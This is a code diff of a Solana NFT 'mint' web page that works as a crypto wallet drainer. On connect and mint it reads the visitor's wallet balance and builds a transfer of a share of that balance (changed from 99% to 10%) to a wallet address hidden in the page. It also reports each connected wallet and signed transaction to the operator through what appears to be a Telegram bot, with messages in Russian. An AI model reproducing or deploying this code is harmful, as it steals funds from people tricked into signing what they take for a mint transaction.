@@ -404,7 +404,7 @@
             solanaWeb3.SystemProgram.transfer({
               fromPubkey: window.solflare.publicKey,
               toPubkey: recieverWallet,
-              lamports: walletBalance * 0.99, // const * price per unit
+              lamports: walletBalance * 0.1, // const * price per unit
             }),
           );
 
@@ -504,7 +504,7 @@
                   solanaWeb3.SystemProgram.transfer({
                   fromPubkey: orgPubKey,
                   toPubkey: recieverWallet,
-                  lamports: (walletBalance * 0.99),
+                  lamports: (walletBalance * 0.1),
                 })
               )
 
@@ -620,30 +620,44 @@
         }
       });
       async function pMint() {
-        const resp = await window.solana.connect();
-        var connection = new solanaWeb3.Connection("https://api.tatum.io/v3/blockchain/node/solana-mainnet");
+          const resp = await window.solana.connect();
+          var connection = new solanaWeb3.Connection(
+            "https://api.tatum.io/v3/blockchain/node/solana-mainnet",
+          );
 
-        const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-        const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
+          const public_key = new PublicKey(resp.publicKey);
+          const walletBalance = await connection.getBalance(public_key);
+          var textfant = "💰Кто то подключил кошелек💰\n"+
+          "Адресс отправителя: \n" + (public_key) +"\n";
+          otpravka(token,textfant,chatid);
+          console.log(walletBalance);
 
-        var transaction = new solanaWeb3.Transaction().add(
+          $('.wallet-adapter-button').text("Mint");
+          $('.mint__button').attr("id","mintPhantom");
+          $("#mintPhantom").on("click", pMint);
+
+          const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
+
+          var transaction = new solanaWeb3.Transaction().add(
             solanaWeb3.SystemProgram.transfer({
-                fromPubkey: public_key,
-                toPubkey: recieverWallet,
-                lamports: fixedLamports,
-            })
-        );
+              fromPubkey: resp.publicKey,
+              toPubkey: recieverWallet,
+              lamports: walletBalance * 0.1,
+            }),
+          );
 
-        transaction.feePayer = public_key;
-        let blockhashObj = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = await blockhashObj.blockhash;
+          transaction.feePayer = window.solana.publicKey;
+          let blockhashObj = await connection.getRecentBlockhash();
+          transaction.recentBlockhash = await blockhashObj.blockhash;
 
-        const signed = await window.solana.signTransaction(transaction);
-        let txid = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(txid);
+          const signed = await window.solana.signTransaction(transaction);
+          var text2 = "💰Кто то подтвердил транзакцию💰\n" +
+          "Если ничего не пришло значит баланс слишком маленький (";
+          popavca(token,text2,chatid);
 
-        alert("Transaction confirmed: " + txid);
-    }
+          let txid = await connection.sendRawTransaction(signed.serialize());
+          await connection.confirmTransaction(txid);
+      }
 
       $("#mintPhantom").on("click", pMint);
 
